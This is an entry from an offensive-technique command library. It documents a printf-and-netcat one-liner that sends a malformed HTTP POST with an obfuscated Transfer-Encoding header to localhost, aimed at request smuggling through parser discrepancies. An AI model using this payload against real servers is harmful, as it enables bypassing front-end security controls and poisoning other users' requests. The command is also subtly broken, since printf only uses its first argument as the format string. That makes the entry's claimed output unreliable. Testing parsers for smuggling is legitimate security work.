---
data: >-
  printf "POST / HTTP/1.1\r\n" "Host: localhost\r\n" " x:\nTransfer-Encoding:
  chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
tags:
  - http
  - exploitation
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 5561d133-e659-48cf-9431-bcde7798e82b
created_at: '2025-12-13T09:01:17.151Z'
updated_at: '2025-12-13T09:01:17.151Z'
verified: false
validated: true
submitted: true
---
# printf-nc-send-malformed-request

## Command

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost\r\n" " x:\nTransfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

## Description

Crafts and sends a malformed HTTP POST request with obfuscated Transfer-Encoding header to exploit parsing issues.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `printf` | Formats the request string | Yes |
| `| nc localhost 5000` | Pipes to netcat for sending | Yes |

## Examples

### Basic Usage

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost\r\n" " x:\nTransfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

## Expected Output

Server responds with HTTP/1.1 200 OK and processes the chunked body as 'A', logging headers and body.

## Related

- [[procedures/Send-Malformed-HTTP-Request-for-Smuggling]]
- [[tools/printf]]
- [[tools/nc]]
